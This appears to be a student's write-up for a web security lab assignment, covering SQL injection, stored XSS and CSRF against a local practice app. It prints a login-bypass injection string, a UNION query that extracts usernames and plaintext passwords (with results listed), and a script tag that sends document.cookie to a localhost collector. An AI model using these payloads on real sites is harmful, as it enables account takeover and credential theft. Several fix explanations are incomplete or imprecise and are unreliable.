```markdown
# Assignment 4 Write-up — <your name>

## V1 — SQL Injection
- Exploit (login bypass): <username=quartermaster' -- > — why it worked in one sentence.
This exploit worked pretty easily as the ' -- causes it to stop looking for a username after quartermaster and the -- portion then
sequence breaks the rest of the code by making it register as a comment letting us get in just by knowing the username

- Exploit (UNION exfil): <q=connorwashere%' UNION SELECT id, username || '::' || password, credits FROM users -- " \> — what data you recovered.
Below is the username password and credit ammounts it managed to extract
alice::sunshine22 — 500 credits
bob::hunter2! — 320 credits
mallory::letmein123 — 40 credits
quartermaster::Gr@nite-Ferry-71 — 9999 credits

- Fix: <what you changed in /login and /search> (mention bcrypt only if you did the bonus).
The fix first caused it to read the stuff a purely text submission, where before ' would cause it to end as a command, now it reads it as a pure text looking
for that in the answer.

## V2 — Stored XSS
- Exploit: <<script>fetch('http://localhost:9000/collection?value=' + encodeURIComponent(document.cookie))</script>` > — where it was stored, who it affected.
My payload was stored locally and I ran it to attack on port 9000.It used my malory account to get access to alice's account

- Fix: <encoding change> + <the CSP header you added> + <HttpOnly>.
I had it simply 

- One sentence: why CSP helps even if you miss an escaping bug.

## V3 — CSRF
- Exploit: <how csrf-poc.html works> — why the cookie was enough.
- Fix: <the token mechanism> + <SameSite change>.
By adding samesite strict it now only takes the cookie from the site and cannot transfer it to be used elsewhere and HttpOnly makes it so javascript cannot
access it.
- One sentence: why the attacker cannot forge a valid token.
The server has its own way of distributing the cryptography and keys, if someone were to just keep guessing by brute force it would take far too long since most
sites at a minimum do 128 bit keys.

## Time spent
<hours> — anything that took longer than expected?

Something that took a lot longer than expected was just getting the NPM install to work. I had to downgrade my node.js to a specific version,
clear my cache and overall figuring that out took me around 40 minutes of staring at it trying to get things to work.
```
